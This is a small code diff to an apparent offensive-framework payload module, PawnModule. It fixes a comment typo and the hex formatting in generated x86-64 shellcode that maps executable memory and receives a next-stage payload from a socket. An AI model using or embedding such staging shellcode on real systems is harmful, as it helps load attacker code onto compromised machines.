@@ -33,14 +33,14 @@ class PawnModule(Module, Socket, Assembler):
         payload = dedent(f"""\
             start:
                 /*
-                 * Allocate space in memory for out phase
+                 * Allocate space in memory for our phase
                  * mmap(NULL, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
                  */
 
                 push 0x9
                 pop rax
                 xor rdi, rdi
-                push {'0x%08x' % length}
+                push {hex(length)}
                 pop rsi
                 push 0x7
                 pop rdx
@@ -97,7 +97,7 @@ class PawnModule(Module, Socket, Assembler):
                 push 0x2d
                 pop rax
                 pop rsi
-                push {'0x%08x' % length}
+                push {hex(length)}
                 pop rdx
                 push 0x100
                 pop r10
